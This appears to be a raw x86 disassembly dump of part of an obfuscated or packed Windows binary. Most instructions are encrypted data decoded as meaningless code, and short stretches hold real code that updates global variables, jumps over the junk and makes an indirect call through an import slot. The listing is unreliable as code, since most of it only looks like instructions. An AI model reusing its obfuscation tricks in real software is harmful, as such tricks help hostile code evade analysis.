  40591d:	out    dx,eax
  40591e:	stos   BYTE PTR es:[edi],al
  40591f:	lods   eax,DWORD PTR ds:[esi]
  405920:	in     al,dx
  405921:	adc    ch,BYTE PTR [edi+0x148b3bdf]
  405927:	mov    dl,0x60
  405929:	rcl    ebp,cl
  40592b:	adc    al,0xc7
  40592d:	pop    ss
  40592e:	inc    edx
  40592f:	js     0x40592d
  405931:	enter  0x2507,0x34
  405935:	pop    ds
  405936:	push   es
  405937:	icebp  
  405938:	smsw   WORD PTR [ecx-0x3c97f765]
  40593f:	ret    
  405940:	cli    
  405941:	inc    eax
  405942:	dec    ebx
  405943:	sub    eax,0x30a2fd5d
  405948:	xor    eax,0x9a6d063b
  40594d:	jmp    0xb6ce:0x1877b6cf
  405954:	or     ah,BYTE PTR [ebp+0x27861bf4]
  40595a:	sbb    eax,0x40452792
  40595f:	cli    
  405960:	lods   eax,DWORD PTR ds:[esi]
  405961:	mov    cl,0xf0
  405963:	add    DWORD PTR [edi],ebp
  405965:	or     BYTE PTR [esi-0x4d],al
  405968:	xor    eax,DWORD PTR [ebx]
  40596a:	inc    edi
  40596b:	out    dx,eax
  40596c:	mov    ?,WORD PTR [ebx-0x76]
  40596f:	scas   eax,DWORD PTR es:[edi]
  405970:	lea    esi,[esp+ebx*8-0x48b43f3]
  405977:	repnz push esi
  405979:	pusha  
  40597a:	xchg   edx,eax
  40597b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40597c:	pop    ecx
  40597d:	test   al,0xf8
  40597f:	xor    BYTE PTR [edx+0xe],al
  405982:	push   ecx
  405983:	dec    esp
  405984:	retf   0x1c99
  405987:	cs mov ?,ebx
  40598a:	mov    edx,0xa6b32c16
  40598f:	sbb    al,0x88
  405991:	push   esi
  405992:	ret    0x1e5b
  405995:	fmul   st,st(7)
  405997:	xlat   BYTE PTR ds:[ebx]
  405998:	test   DWORD PTR [ebp+0x28],edi
  40599b:	sbb    al,0x5f
  40599d:	push   esp
  40599e:	fist   WORD PTR [ebx]
  4059a0:	or     ebp,DWORD PTR [ebp+ebp*1-0x311d8cbc]
  4059a7:	jge    0x40595c
  4059a9:	nop
  4059aa:	or     eax,0x3be10cf8
  4059af:	mov    ebp,0x5f215ac7
  4059b4:	mov    al,0xf4
  4059b6:	call   DWORD PTR [eax+esi*2-0x4022c15c]
  4059bd:	or     BYTE PTR [esi],ch
  4059bf:	mov    ecx,0x84f9f458
  4059c4:	pop    esi
  4059c5:	sub    esi,ebx
  4059c7:	repz push ds
  4059c9:	adc    DWORD PTR [ecx],eax
  4059cb:	stos   DWORD PTR es:[edi],eax
  4059cc:	mov    DWORD PTR [esi],ecx
  4059ce:	sub    eax,0x48843747
  4059d3:	add    ecx,DWORD PTR [edx]
  4059d5:	and    ebx,0xffffffb7
  4059d8:	test   DWORD PTR [edi+0x6f440a90],ecx
  4059de:	jne    0x40596b
  4059e0:	data16 jp 0x405a2f
  4059e3:	dec    edx
  4059e4:	cwde   
  4059e5:	xor    al,0xe6
  4059e7:	fild   DWORD PTR [ebp-0x645f4ed]
  4059ed:	(bad)  
  4059ee:	ds cwde 
  4059f0:	jbe    0x405a09
  4059f2:	fisttp QWORD PTR [ecx]
  4059f4:	out    0xb7,al
  4059f6:	push   ecx
  4059f7:	(bad)  
  4059f8:	xchg   ecx,eax
  4059f9:	call   0xc4cc:0x44f9ecf2
  405a00:	xor    esp,ebx
  405a02:	jp     0x4059bc
  405a04:	or     al,0x5a
  405a06:	dec    edx
  405a07:	push   ecx
  405a08:	and    ecx,0xeeef659d
  405a0e:	adc    eax,0x890b79c7
  405a13:	repz in eax,0x91
  405a16:	ins    DWORD PTR es:[edi],dx
  405a17:	and    eax,DWORD PTR [edi-0x39257f6b]
  405a1d:	jno    0x4059f7
  405a1f:	pop    ecx
  405a20:	jl     0x4059d7
  405a22:	sti    
  405a23:	sbb    eax,0x8c6b5c78
  405a28:	mov    bl,0xaf
  405a2a:	pushf  
  405a2b:	nop
  405a2c:	mov    edi,0x7c2f9292
  405a31:	cmp    edi,eax
  405a33:	inc    ebp
  405a34:	cld    
  405a35:	xor    al,0x85
  405a37:	pushf  
  405a38:	clc    
  405a39:	and    DWORD PTR ds:0x43355b,edx
  405a3f:	mov    eax,DWORD PTR [ebp-0x4]
  405a42:	mov    edx,DWORD PTR ds:0x43366f
  405a48:	xor    DWORD PTR ds:0x433543,edx
  405a4e:	push   esi
  405a4f:	mov    DWORD PTR ds:0x433667,0x6ead
  405a59:	mov    esi,DWORD PTR [ebp-0x8]
  405a5c:	mov    edx,0x7510853
  405a61:	and    DWORD PTR ds:0x43353f,ebx
  405a67:	xor    eax,edx
  405a69:	and    DWORD PTR ds:0x43361b,0x0
  405a73:	mov    ecx,DWORD PTR ds:0x43361b
  405a79:	inc    ecx
  405a7a:	mov    DWORD PTR ds:0x43361b,ecx
  405a80:	cmp    DWORD PTR ds:0x43361b,0x20
  405a87:	jne    0x405a99
  405a8d:	push   DWORD PTR [ebp-0x1c]
  405a90:	push   DWORD PTR [ebp-0x24]
  405a93:	call   DWORD PTR ds:0x412258
  405a99:	cmp    DWORD PTR ds:0x43361b,0x15
  405aa0:	jb     0x405a73
  405aa6:	xor    ecx,ecx
  405aa8:	add    ecx,DWORD PTR ds:0x43357b
  405aae:	mov    ecx,DWORD PTR [ecx]
  405ab0:	sbb    DWORD PTR ds:0x433657,ecx
  405ab6:	xor    esi,edx
  405ab8:	mov    ecx,0x32729a
  405abd:	add    esi,ecx
  405abf:	jmp    0x405e93
  405ac4:	aam    0x49
  405ac6:	in     eax,0x76
  405ac8:	ins    DWORD PTR es:[edi],dx
  405ac9:	jb     0x405b1e
  405acb:	imul   ebx,DWORD PTR ds:0x294d28f4,0x464ef90a
  405ad5:	xor    edi,DWORD PTR [esp+edi*2-0x4b]
  405ad9:	jns    0x405b57
  405adb:	jl     0x405aab
  405add:	fstp   TBYTE PTR [ecx-0x3a]
  405ae0:	sbb    DWORD PTR [edx],ebx
  405ae2:	lods   eax,DWORD PTR ds:[esi]
  405ae3:	cmp    al,cl
  405ae5:	rcr    BYTE PTR [esi-0x58539acd],cl
  405aeb:	je     0x405af2
  405aed:	ds jmp 0x405b48
  405af0:	add    dl,BYTE PTR [edi-0x795a3d3]
  405af6:	mov    WORD PTR [esi],ds
  405af8:	ret    
  405af9:	daa    
  405afa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405afb:	mov    ebp,0x931b3ae1
  405b00:	jo     0x405b27
  405b02:	xor    edx,DWORD PTR [ebp+0x5a]
  405b05:	push   esp
  405b06:	push   ebx
  405b07:	sub    DWORD PTR gs:[eax],ebp
  405b0a:	xchg   esp,eax
  405b0b:	inc    eax
  405b0c:	shl    BYTE PTR ds:[ecx+0x51155899],1
  405b13:	hlt    
  405b14:	test   DWORD PTR [ebp-0x2e],ebp
  405b17:	outs   dx,BYTE PTR ds:[esi]
  405b18:	xchg   ecx,eax
  405b19:	adc    ch,al
  405b1b:	inc    esp
  405b1c:	or     DWORD PTR [edx+0x5509c64c],esi
  405b22:	test   DWORD PTR [ecx-0x41b56e3c],ecx
  405b28:	fldcw  WORD PTR [bx]
  405b2b:	sbb    esi,DWORD PTR [edi-0x44]
  405b2e:	dec    ecx
  405b2f:	push   ecx
  405b30:	jno    0x405b37
  405b32:	ds pop ecx
  405b34:	push   ds
  405b35:	mov    ?,esi
  405b37:	fimul  DWORD PTR [ebx+edx*4-0x3521cca9]
  405b3e:	pop    esp
  405b3f:	sub    ebp,DWORD PTR [ebp-0x5b]
  405b42:	lock pop edi
  405b45:	xlat   BYTE PTR ds:[ebx]
  405b46:	mov    ecx,0xc19eeede
  405b4b:	and    al,0x49
  405b4d:	vandps ymm3,ymm4,YMMWORD PTR [ecx+eax*2+0x4f]
  405b53:	ud2    
  405b55:	add    eax,0x7caccab8
  405b5a:	pushf  
  405b5b:	cdq    
  405b5c:	es push ebp
  405b5e:	inc    eax
  405b5f:	ja     0x405b40
  405b61:	(bad)  
  405b62:	in     eax,0x35
  405b64:	push   esp
  405b65:	aas    
  405b66:	out    dx,al
  405b67:	xchg   edi,eax
  405b68:	dec    esp
  405b69:	mov    eax,0x581edde
  405b6e:	push   esp
  405b6f:	jle    0x405b1e
  405b71:	sahf   
  405b72:	fs dec esp
  405b74:	push   ss
  405b75:	sub    DWORD PTR [ebx-0x58],0x8aa3f354
  405b7c:	add    al,0x46
  405b7e:	(bad)  
  405b7f:	sub    BYTE PTR [edx+0x3b],ah
  405b82:	idiv   DWORD PTR [ebp+0x5b]
  405b85:	pop    ebp
  405b86:	fs (bad) 
  405b88:	jo     0x405b29
  405b8a:	pop    ds
  405b8b:	(bad)  
  405b8c:	in     al,0xdd
  405b8e:	pop    esi
  405b8f:	dec    esi
  405b90:	cmp    bh,ch
  405b92:	cmp    DWORD PTR [edx-0x25],0xc18cd412
  405b99:	lock mov dl,0x5f
  405b9c:	test   al,0x69
  405b9e:	pop    ecx
  405b9f:	sbb    eax,0x4d2e3e87
  405ba4:	adc    edx,ebp
  405ba6:	pop    ecx
  405ba7:	and    esp,ecx
  405ba9:	(bad)  
  405baa:	jmp    0xde68:0x84adc0b7
  405bb1:	inc    esp
  405bb2:	aam    0xc3
  405bb4:	xchg   esi,eax
  405bb5:	out    dx,eax
  405bb6:	test   al,0x82
  405bb8:	inc    edi
  405bb9:	loope  0x405b89
  405bbb:	sbb    bh,0x17
  405bbe:	jb     0x405b8f
  405bc0:	xor    ecx,DWORD PTR [esi+0x4ac8f0d6]
  405bc6:	pusha  
  405bc7:	xlat   BYTE PTR ds:[ebx]
  405bc8:	add    DWORD PTR [ebx+0x65],esp
  405bcb:	ins    DWORD PTR es:[edi],dx
  405bcc:	(bad)  
  405bcd:	out    0xef,eax
  405bcf:	in     eax,0xa
  405bd1:	push   edi
  405bd2:	(bad)  
  405bd3:	das    
  405bd4:	xor    ebp,DWORD PTR [esi+0x20]
  405bd7:	jmp    0x4ee81433
  405bdc:	lds    edx,FWORD PTR [ebx+eiz*1+0x55]
  405be0:	loop   0x405b67
  405be2:	mov    DWORD PTR [ecx-0xc],esi
  405be5:	xor    eax,0xd710e978
  405bea:	pop    ecx
  405beb:	les    ecx,FWORD PTR [eax]
  405bed:	pop    edx
  405bee:	rcl    BYTE PTR [ebx+0x11],0xfb
  405bf2:	cli    
  405bf3:	fadd   st(1),st
  405bf5:	jle    0x405bf3
  405bf7:	mov    al,ds:0x1aa0745d
  405bfc:	inc    edi
  405bfd:	push   ss
  405bfe:	retf   0x445f
  405c01:	mov    cl,0xc5
  405c03:	jae    0x405bdb
  405c05:	adc    cl,BYTE PTR [ebp+0x1f3e8350]
  405c0b:	mov    esi,0xa8aa5e7e
  405c10:	in     al,0xfd
  405c12:	push   edx
  405c13:	ror    DWORD PTR [edx+esi*2-0x6d71a6c],0xd6
  405c1b:	test   dh,ch
  405c1d:	mov    ecx,0x558de241
  405c22:	in     al,dx
  405c23:	hlt    
  405c24:	jbe    0x405c0f
  405c26:	pusha  
  405c27:	and    esp,ebp
  405c29:	div    DWORD PTR [edi+ecx*2+0x25]
  405c2d:	ss cli 
  405c2f:	sbb    esp,ebp
  405c31:	xor    edx,ecx
  405c33:	mov    BYTE PTR [ebx-0x19],cl
  405c36:	inc    esp
  405c37:	test   eax,0x8d010d8b
  405c3c:	jp     0x405bcc
  405c3e:	fiadd  DWORD PTR [edx]
  405c40:	js     0x405c47
  405c42:	cli    
  405c43:	push   eax
  405c44:	and    al,BYTE PTR [edi+0x64dad44a]
  405c4a:	jmp    0xbdf54f1
  405c4f:	in     al,0x61
  405c51:	ss inc ebx
  405c53:	lahf   
  405c54:	pop    ss
  405c55:	lods   al,BYTE PTR ds:[esi]
  405c56:	pusha  
  405c57:	in     eax,0xca
  405c59:	sbb    al,0x98
  405c5b:	dec    BYTE PTR [eax]
  405c5d:	addr16 inc ebx
  405c5f:	xchg   esp,eax
  405c60:	xor    DWORD PTR [eax],eax
  405c62:	sub    dl,BYTE PTR [edi-0x6f]
  405c65:	jne    0x405ca4
  405c67:	and    BYTE PTR [ecx+0x1c73bb97],dh
  405c6d:	cli    
  405c6e:	js     0x405c70
  405c70:	push   ds
  405c71:	push   0xfb85f2f2
  405c76:	inc    eax
  405c77:	loop   0x405c41
  405c79:	(bad)  
  405c7b:	cmp    esi,DWORD PTR [edx-0x585ff15]
  405c81:	inc    ebx
  405c82:	out    0x41,eax
  405c84:	xor    dl,bh
  405c86:	adc    cl,BYTE PTR [edi]
  405c88:	adc    DWORD PTR [ebp+0x77cfcc54],eax
  405c8e:	ja     0x405c7a
  405c90:	pop    ebp
  405c91:	pop    ebp
  405c92:	dec    ebx
  405c93:	in     al,dx
  405c94:	(bad)  
  405c95:	and    eax,0x11a07e7c
  405c9a:	dec    esp
  405c9b:	inc    ebx
  405c9c:	xchg   esp,eax
  405c9d:	pop    esp
  405c9e:	pop    ebp
  405c9f:	jp     0x405c8c
  405ca1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ca2:	jo     0x405c8a
  405ca4:	xor    DWORD PTR [edi],edi
  405ca6:	out    dx,eax
  405ca7:	loop   0x405cf9
  405ca9:	out    0xab,al
  405cab:	cmc    
  405cac:	xchg   ch,ah
  405cae:	cmp    eax,0xb7176954
  405cb3:	pop    esp
  405cb4:	sbb    BYTE PTR [ebx-0x73],ah
  405cb7:	inc    eax
  405cb8:	daa    
  405cb9:	sti    
  405cba:	scas   al,BYTE PTR es:[edi]
  405cbb:	cmp    al,0x4d
  405cbd:	dec    ebx
  405cbe:	mov    ebx,0xee96792b
  405cc3:	cmp    ch,bl
  405cc5:	push   ss
  405cc6:	mov    eax,0x54e51a44
  405ccb:	sub    ebx,DWORD PTR [edx-0x1]
  405cce:	push   ecx
  405ccf:	jmp    0xc2f9:0xe36b12d6
  405cd6:	or     DWORD PTR [edi-0x2a48f2eb],esi
  405cdc:	loopne 0x405d54
  405cde:	and    bl,BYTE PTR [eax-0x29a3674d]
  405ce4:	loope  0x405d03
  405ce6:	mov    esi,DWORD PTR [edx+0x27]
  405ce9:	popf   
  405cea:	(bad)  
  405ceb:	fnsave [ebp+edx*4+0x56289b3]
  405cf2:	and    dh,BYTE PTR [edi+ebp*2]
  405cf5:	nop
  405cf6:	push   ss
  405cf7:	cdq    
  405cf8:	addr16 mov ds:0xb4f2,al
  405cfc:	push   0xffffff92
  405cfe:	pop    eax
  405cff:	mov    ecx,0x1c375660
  405d04:	cs xchg esi,eax
  405d06:	pushf  
  405d07:	dec    esp
  405d08:	and    ecx,DWORD PTR [ebx-0x2d]
  405d0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d0c:	mov    ebp,0xd90f6d29
  405d11:	test   eax,0x183d111c
  405d16:	xchg   esi,eax
  405d17:	adc    ebx,DWORD PTR [ecx+0x6b]
  405d1a:	push   es
  405d1b:	shl    BYTE PTR [edi+0x1f673b1d],0xa
  405d22:	dec    esp
  405d23:	xor    BYTE PTR [edi+0x5ca0b748],bh
  405d29:	jae    0x405cc5
  405d2b:	cmp    DWORD PTR [ecx-0x45718072],esp
  405d31:	pop    es
  405d32:	pop    ebx
  405d33:	xchg   edx,eax
  405d34:	ins    BYTE PTR es:[edi],dx
  405d35:	inc    esp
  405d36:	repz loopne 0x405d0b
  405d39:	sbb    eax,DWORD PTR [ebp+0x7f82ad59]
  405d3f:	push   esp
  405d40:	adc    ebx,edi
  405d42:	aad    0xe1
  405d44:	lods   eax,DWORD PTR ds:[esi]
  405d45:	loope  0x405ced
  405d47:	jae    0x405d61
  405d49:	into   
  405d4a:	jb     0x405d97
  405d4c:	test   DWORD PTR [ecx+0x6bc1df83],0x721a34be
  405d56:	in     eax,0x86
  405d58:	out    dx,eax
  405d59:	cmp    al,0xee
  405d5b:	push   ecx
  405d5c:	sbb    DWORD PTR [ecx+0x412df88b],ecx
  405d62:	pop    edi
  405d63:	push   0x1c
  405d65:	aad    0x92
  405d67:	sti    
  405d68:	xchg   edx,eax
  405d69:	adc    ebx,DWORD PTR [ecx+0x4e78966]
  405d6f:	fcom   QWORD PTR [edx]
  405d71:	hlt    
  405d72:	and    dl,cl
  405d74:	icebp  
  405d75:	xor    BYTE PTR [edx-0x80],dl
  405d78:	xchg   ebp,eax
  405d79:	inc    esi
  405d7a:	out    0x27,eax
  405d7c:	pop    ecx
  405d7d:	rcl    DWORD PTR [ecx+0x37964c57],0xf
  405d84:	mov    cs,WORD PTR [ebx+eiz*1+0x281a8448]
  405d8b:	repz cmp esp,DWORD PTR [edi+0x240bb658]
  405d92:	or     DWORD PTR ds:0x830531be,esi
  405d98:	mov    eax,ds:0x7086afcd
  405d9d:	je     0x405dda
  405d9f:	popf   
  405da0:	inc    ebp
  405da1:	push   ss
  405da2:	cmp    al,0x70
  405da4:	jnp    0x405d7f
  405da6:	imul   ebp,ebp,0x5401de1b
  405dac:	pop    eax
  405dad:	dec    ecx
  405dae:	pop    ss
  405daf:	data16 int 0x74
  405db2:	loope  0x405da5
  405db4:	xor    al,bh
  405db6:	xor    ah,BYTE PTR [eax+0x41b77f64]
  405dbc:	dec    ecx
  405dbd:	sub    al,0x4b
  405dbf:	and    esi,esp
  405dc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405dc2:	data16 jno 0x405df0
  405dc5:	aas    
  405dc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405dc7:	(bad)  
  405dc8:	xor    DWORD PTR [ebp+0x34ff2f4c],esp
  405dce:	(bad)  
  405dd0:	pusha  
  405dd1:	mov    al,0x8b
  405dd3:	ret    
  405dd4:	das    
  405dd5:	jmp    0x33d1:0x99ef346b
  405ddc:	jle    0x405dcf
  405dde:	fnsave ds:[edi-0x28e91802]
  405de5:	jp     0x405d71
  405de7:	(bad)
  405dea:	jno    0x405dcb
  405dec:	push   esp
  405ded:	xor    BYTE PTR [edi],bh
  405def:	push   ss
  405df0:	mov    ebp,0x8106fe81
  405df5:	push   0xffffffef
  405df7:	ret    
  405df8:	pop    ss
  405df9:	push   ecx
  405dfa:	outs   dx,DWORD PTR ds:[esi]
  405dfb:	push   ebp
  405dfc:	sbb    al,BYTE PTR [ecx+0x38]
  405dff:	out    dx,eax
  405e00:	adc    al,0xfd
  405e02:	bound  eax,QWORD PTR [esi-0x42]
  405e05:	test   DWORD PTR [edi+0x15],esi
  405e08:	push   ss
  405e09:	push   esi
  405e0a:	leave  
  405e0b:	sub    al,0x90
  405e0d:	in     al,0x2b
  405e0f:	sbb    eax,0x8d7c5c3d
  405e14:	addr16 adc dh,al
  405e17:	rdmsr  
  405e19:	sbb    ecx,esp
  405e1b:	test   BYTE PTR [edx+0x7],cl
  405e1e:	test   DWORD PTR [ebp-0x9],ecx
  405e21:	fucomi st,st(1)
  405e23:	leave  
  405e24:	pop    ds
  405e25:	mov    ebx,0xec6fdd24
  405e2a:	outs   dx,BYTE PTR ds:[esi]
  405e2b:	aam    0x51
  405e2d:	inc    ebp
  405e2e:	push   ds
  405e2f:	cmp    eax,0xeeda7c44
  405e34:	fldcw  WORD PTR [ebp+eiz*8+0x7]
  405e38:	sar    DWORD PTR [ecx],1
  405e3a:	adc    eax,0x91034552
  405e3f:	mov    DWORD PTR [ebx],ebp
  405e41:	into   
  405e42:	mov    DWORD PTR [eax],ebp
  405e44:	and    BYTE PTR [edx],dh
  405e46:	inc    esp
  405e47:	mov    dh,0x37
  405e49:	(bad)  
  405e4b:	dec    eax
  405e4c:	outs   dx,BYTE PTR ds:[esi]
  405e4d:	push   0x3e
  405e4f:	shr    BYTE PTR [esi+0x21],0x37
  405e53:	push   edi
  405e54:	inc    ebp
  405e55:	jmp    0x8cf7:0xac113fd5
  405e5c:	adc    al,0x14
  405e5e:	(bad)  
  405e5f:	cmp    edx,esp
  405e61:	nop
  405e62:	fcmovne st,st(1)
  405e64:	imul   ebx,DWORD PTR [esi],0xffffffa3
  405e67:	iret   
  405e68:	xor    eax,0x2db6592a
  405e6d:	add    eax,0xc429a957
  405e72:	scas   eax,DWORD PTR es:[edi]
  405e73:	cwde   
  405e74:	jno    0x405e14
  405e76:	jle    0x405ee6
  405e78:	aad    0x98
  405e7a:	(bad)  
  405e7c:	in     al,0xae
  405e7e:	clc    
  405e7f:	adc    al,0x78
  405e81:	sbb    BYTE PTR [edi],0x54
  405e84:	daa    
  405e85:	cmc    
  405e86:	pop    esi
  405e87:	mov    edx,0x7a4adaea
  405e8c:	jecxz  0x405ef1
  405e8e:	push   ss
  405e8f:	cmc    
  405e90:	data16 int 0x59
  405e93:	add    eax,ecx
  405e95:	imul   eax,esi
  405e98:	mov    esi,DWORD PTR [ebp+0xc]
  405e9b:	cmp    esi,eax
  405e9d:	jne    0x405eb9
  405ea3:	mov    eax,DWORD PTR [ebp-0x4]
  405ea6:	mov    esi,DWORD PTR [ebp-0x8]
  405ea9:	xor    eax,edx
  405eab:	xor    esi,edx
  405ead:	add    eax,ecx
  405eaf:	add    esi,ecx
  405eb1:	imul   eax,esi
  405eb4:	jmp    0x4062c8
  405eb9:	mov    eax,DWORD PTR [ebp+0xc]
  405ebc:	mov    eax,DWORD PTR [eax+0x78]
  405ebf:	mov    DWORD PTR [ebp+0xc],eax
  405ec2:	mov    eax,DWORD PTR [ebp-0x4]
  405ec5:	jmp    0x406299
  405eca:	bound  edx,QWORD PTR [eax-0x1c8e3b49]
  405ed0:	jge    0x405e84
  405ed2:	pop    ecx
  405ed3:	jo     0x405ebe
  405ed5:	mov    esi,0x864b8c0e
  405eda:	(bad)  
  405edb:	aas    
  405edc:	jl     0x405f5a
  405ede:	mov    ch,0x79
  405ee0:	jl     0x405f5e
  405ee2:	or     ch,BYTE PTR [ebp+0x75515822]
  405ee8:	icebp  
  405ee9:	jle    0x405f20
  405eeb:	jo     0x405f13
  405eed:	dec    esi
  405eee:	sub    DWORD PTR [ebx+ebp*8],ecx
  405ef1:	lock je 0x405f64
  405ef4:	stos   DWORD PTR es:[edi],eax
  405ef5:	jle    0x405ea6
  405ef7:	leave  
  405ef8:	ins    BYTE PTR es:[edi],dx
  405ef9:	pop    esp
  405efa:	frstor [esi]
  405efc:	push   edi
  405efd:	outs   dx,DWORD PTR ds:[esi]
  405efe:	xchg   edx,eax
  405eff:	cmp    al,0x67
  405f01:	or     BYTE PTR ds:0xd11451e0,dl
  405f07:	cli    
  405f08:	popa   
  405f09:	call   0x3911:0xe1f8d018
  405f10:	rol    BYTE PTR [eax-0x3cf76456],0xbd
  405f17:	pushf  
  405f18:	mov    esi,DWORD PTR [ebp+0xa]
  405f1b:	rcl    DWORD PTR [esi+0xc],1
  405f1e:	cs mov ch,0x64
  405f21:	loopne 0x405eaf
  405f23:	pop    edi
  405f24:	sub    bh,BYTE PTR [ecx+0x49d015b9]
  405f2a:	sbb    DWORD PTR [eax],esp
  405f2c:	in     eax,dx
  405f2d:	cdq    
  405f2e:	scas   eax,DWORD PTR es:[edi]
  405f2f:	or     ch,ch
  405f31:	jecxz  0x405ed0
  405f33:	jnp    0x405eb5
  405f35:	push   0xffffff86
  405f37:	jge    0x405efb
  405f39:	fwait
  405f3a:	dec    esp
  405f3b:	repnz dec esp
  405f3d:	minps  xmm2,XMMWORD PTR [ecx]
  405f40:	loop   0x405f64
  405f42:	nop
  405f43:	pop    ss
  405f44:	fwait
  405f45:	test   esp,ebp
  405f47:	mov    eax,ds:0x1502f5a1
  405f4c:	rcr    DWORD PTR [esi-0xc861a59],0xf1
  405f53:	sbb    cl,dh
  405f55:	call   0xedca16e7
  405f5a:	lahf   
  405f5b:	rol    BYTE PTR [ebp-0x17],0x7c
  405f5f:	xchg   ebp,eax
  405f60:	fwait
  405f61:	das    
  405f62:	adc    eax,0x890a4c29
  405f67:	je     0x405f02
  405f69:	xchg   esi,eax
  405f6a:	sbb    DWORD PTR [ecx-0x39],esi
  405f6d:	pop    ecx
  405f6e:	fbld   TBYTE PTR [esi-0x7ddfc757]
  405f74:	test   DWORD PTR [edx],eax
  405f76:	xchg   edx,eax
  405f77:	xlat   BYTE PTR ds:[ebx]
  405f78:	icebp  
  405f79:	sub    DWORD PTR [edx+0x1dbf53a4],edx
  405f7f:	jb     0x405f84
  405f81:	inc    esp
  405f82:	into   
  405f83:	jne    0x405f9b
  405f85:	adc    DWORD PTR [eax],edi
  405f87:	(bad)  [edx+0x57aa233d]
  405f8d:	shr    BYTE PTR [eax],1
  405f8f:	xor    cl,BYTE PTR [edx+0x6f]
  405f92:	adc    eax,0xb6975333
  405f97:	mov    fs,edx
  405f99:	jo     0x405f95
  405f9b:	ins    BYTE PTR es:[edi],dx
  405f9c:	cdq    
  405f9d:	xor    esp,DWORD PTR [ebp-0x50]
  405fa0:	and    BYTE PTR [ebx+0x4f],dh
  405fa3:	add    eax,0xce43694f
  405fa8:	sahf   
  405fa9:	out    0x70,eax
  405fab:	mov    edi,0xa441899c
  405fb0:	push   ecx
  405fb1:	xor    al,0xaa
  405fb3:	aaa    
  405fb4:	mov    esi,0x9361bdab
  405fb9:	jg     0x406005
  405fbb:	pop    ecx
  405fbc:	cld    
  405fbd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405fbe:	ret    
  405fbf:	mov    dl,0x44
  405fc1:	sbb    cl,BYTE PTR [ebx]
  405fc3:	imul   ecx,DWORD PTR [edi+0x6425cf5a],0xffffffd5
  405fca:	cmp    al,0xc5
  405fcc:	jo     0x405f69
  405fce:	jecxz  0x406029
  405fd0:	shl    BYTE PTR [esi-0x820d9c9],1
  405fd6:	mov    dh,0xd8
  405fd8:	sbb    eax,0x43fa886
  405fdd:	fnstcw WORD PTR [ecx-0x31]
  405fe0:	xchg   esi,eax
  405fe1:	or     bh,BYTE PTR [ebx-0x6862439b]
  405fe7:	in     al,0x13
  405fe9:	mov    esi,0x20e84b6
  405fee:	icebp  
  405fef:	stos   DWORD PTR es:[edi],eax
  405ff0:	push   ebp
  405ff1:	fcomi  st,st(3)
  405ff3:	and    BYTE PTR [ecx-0x29],ch
  405ff6:	test   DWORD PTR [edi+0x6550b9da],edi
  405ffc:	sub    eax,0x5f216877
  406001:	call   0xeae1bea5
  406006:	ds (bad) 
  406008:	call   0xb489:0x4deaeeea
  40600f:	push   es
  406010:	xchg   DWORD PTR [edi+0x2f],eax
  406013:	add    esp,esi
  406015:	adc    esi,DWORD PTR [edi]
  406017:	fstp   TBYTE PTR [ebx+0x642d1608]
  40601d:	inc    edx
  40601e:	nop
  40601f:	lds    edx,FWORD PTR [esi]
  406021:	push   0xd1316669
  406026:	push   es
  406027:	push   esp
  406028:	add    BYTE PTR [ebx+0x9],dh
  40602b:	push   edx
  40602c:	xlat   BYTE PTR ds:[ebx]
  40602d:	jns    0x406076
  40602f:	jecxz  0x40600f
  406031:	xor    BYTE PTR [esi-0x5ee21c2f],bl
  406037:	sub    DWORD PTR [eax+0x27],esi
  40603a:	jge    0x406029
  40603c:	or     dh,dl
  40603e:	xchg   ebx,eax
  40603f:	sbb    DWORD PTR [edi+0x353411a8],edi
  406045:	stos   DWORD PTR es:[edi],eax
  406046:	cmp    esp,ecx
  406048:	jecxz  0x406022
  40604a:	push   0xbfd376b0
  40604f:	and    DWORD PTR [ecx+0x1e],ecx
  406052:	loopne 0x406069
  406054:	jg     0x40600c
  406056:	or     BYTE PTR [edx+0x8da66cf],al
  40605c:	retf   
  40605d:	mov    DWORD PTR [esi],esi
  40605f:	sub    BYTE PTR ss:[esi-0xb],cl
  406063:	int3   
  406064:	push   cs
  406065:	jg     0x40604f
  406067:	pop    edx
  406068:	mov    esi,0xd28a8d07
  40606d:	rol    BYTE PTR [edx-0x15],0x87
  406071:	out    0x93,eax
  406073:	jmp    0x5f44:0x53e8efd3
  40607a:	lods   al,BYTE PTR ds:[esi]
  40607b:	and    bl,BYTE PTR [ebx+0x74]
  40607e:	es retf 
  406080:	scas   eax,DWORD PTR es:[edi]
  406081:	mov    esp,0x179b68b9
  406086:	loopne 0x4060b2
  406088:	ret    
  406089:	test   DWORD PTR [eax+ebp*8-0x2e9e018a],0x8830d135
  406094:	rcr    ch,0x64
  406097:	mov    al,0x8f
  406099:	push   es
  40609a:	test   DWORD PTR [edx-0x77],ebx
  40609d:	(bad)  
  40609e:	in     al,0x50
  4060a0:	out    dx,eax
  4060a1:	arpl   si,bp
  4060a3:	cmp    dh,BYTE PTR [esi-0x72]
  4060a6:	mov    ds,WORD PTR [esp+edi*4]
  4060a9:	sub    al,0x3d
  4060ab:	mov    bl,0x9f
  4060ad:	push   0xffffffbe
  4060af:	cli    
  4060b0:	fisub  WORD PTR [eax]
  4060b2:	pop    ecx
  4060b3:	cmp    BYTE PTR [esi-0x3692f60b],0xfc
  4060ba:	mov    ebp,0xc4e53244
  4060bf:	jo     0x4060d6
  4060c1:	shr    DWORD PTR [eax+0xe766ed3],cl
  4060c7:	jg     0x406130
  4060c9:	xor    esi,DWORD PTR ds:0xbec66aaa
  4060cf:	mov    edi,0xa70079eb
  4060d4:	(bad)  
  4060d6:	mov    bl,0x40
  4060d8:	ins    BYTE PTR es:[edi],dx
  4060d9:	jae    0x40614b
  4060db:	sbb    ebp,DWORD PTR [eax+eax*1]
  4060de:	aas    
  4060df:	retf   
  4060e0:	xchg   esp,eax
  4060e1:	jno    0x40615d
  4060e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4060e4:	fisttp WORD PTR [edx]
  4060e6:	mov    dh,0x71
  4060e8:	popf   
  4060e9:	xchg   edi,eax
  4060ea:	fucomi st,st(6)
  4060ec:	lea    esi,[edx]
  4060ee:	push   ebp
  4060ef:	out    dx,eax
  4060f0:	dec    ebx
  4060f1:	pusha  
  4060f2:	mov    edi,0xa5e719ee
  4060f7:	and    eax,0x6370c0a3
